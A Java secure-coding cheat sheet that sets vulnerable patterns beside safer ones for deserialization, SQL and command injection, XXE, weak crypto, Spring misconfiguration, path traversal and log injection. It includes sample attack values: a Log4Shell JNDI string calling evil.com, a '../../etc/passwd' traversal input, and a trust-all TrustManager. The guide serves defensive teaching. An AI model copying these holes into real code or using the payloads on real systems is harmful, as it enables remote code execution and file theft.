# Java — Common Security Patterns

## Deserialization (Top Java Threat)

| Pattern | Risk | Severity |
|---------|------|----------|
| `ObjectInputStream.readObject()` with untrusted data | RCE via gadget chains | 🔴 Critical |
| `XMLDecoder.readObject()` | RCE | 🔴 Critical |
| `XStream.fromXML(untrusted)` | RCE (pre-1.4.18) | 🔴 Critical |
| `SnakeYAML` `yaml.load()` without `SafeConstructor` | RCE | 🔴 Critical |
| `readResolve()` / `readObject()` custom implementations | Potential deserialization gadget | 🟠 High |

```java
// Vulnerable
ObjectInputStream ois = new ObjectInputStream(untrustedStream);
Object obj = ois.readObject();  // Arbitrary code execution

// Safer: use allowlist filter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.*;!*");
ois.setObjectInputFilter(filter);
```

## SQL Injection

| Pattern | Risk | Severity |
|---------|------|----------|
| `Statement.execute("SELECT ... " + userInput)` | SQL injection | 🔴 Critical |
| String concatenation in JPQL/HQL | Injection in ORM queries | 🟠 High |
| `JdbcTemplate.query(sql + param)` | SQL injection via Spring | 🟠 High |

```java
// Vulnerable
String sql = "SELECT * FROM users WHERE id = " + userId;
stmt.executeQuery(sql);

// Safe: parameterized
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setString(1, userId);
```

## Command Injection

```java
// Vulnerable
Runtime.getRuntime().exec("ping " + userInput);
Runtime.getRuntime().exec(new String[]{"sh", "-c", userInput});

// Safe: avoid shell, use ProcessBuilder with explicit args
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", validatedHost);
```

## XXE (XML External Entity)

```java
// Vulnerable (default parser settings)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(untrustedXml);  // XXE possible

// Safe
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

## Cryptography

| Pattern | Risk | Severity |
|---------|------|----------|
| `Cipher.getInstance("DES")` | Weak algorithm | 🟡 Medium |
| `Cipher.getInstance("AES/ECB/...")` | ECB mode is insecure | 🟡 Medium |
| `MessageDigest.getInstance("MD5")` for passwords | Weak hash | 🟡 Medium |
| `new SecureRandom()` seeded with constant | Predictable PRNG | 🟠 High |
| `TrustManager` that accepts all certificates | SSL bypass | 🔴 Critical |

```java
// Vulnerable: trust-all TrustManager (common in AI-generated code!)
TrustManager[] trustAll = new TrustManager[]{
    new X509TrustManager() {
        public void checkClientTrusted(X509Certificate[] chain, String auth) {}
        public void checkServerTrusted(X509Certificate[] chain, String auth) {}
        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
    }
};
```

## Spring Framework

| Pattern | Risk | Severity |
|---------|------|----------|
| `@CrossOrigin(origins = "*")` | Overly permissive CORS | 🟡 Medium |
| Disabled CSRF: `http.csrf().disable()` | CSRF attacks | 🟠 High |
| SpEL injection: `#{user.input}` | RCE via Spring Expression Language | 🔴 Critical |
| Actuator endpoints exposed without auth | Information disclosure, RCE | 🔴 Critical |
| `@RequestMapping` without method restriction | Unintended HTTP methods | 🟡 Medium |

## Path Traversal

```java
// Vulnerable
File file = new File(uploadDir, userFilename);
// userFilename = "../../etc/passwd" traverses out

// Safe: validate canonical path
File file = new File(uploadDir, userFilename);
if (!file.getCanonicalPath().startsWith(new File(uploadDir).getCanonicalPath())) {
    throw new SecurityException("Path traversal detected");
}
```

## Logging Injection

```java
// Vulnerable (especially with Log4j — see dependency references)
logger.info("User logged in: " + username);
// username = "${jndi:ldap://evil.com/exploit}" → Log4Shell

// Safe: use parameterized logging
logger.info("User logged in: {}", username);
```
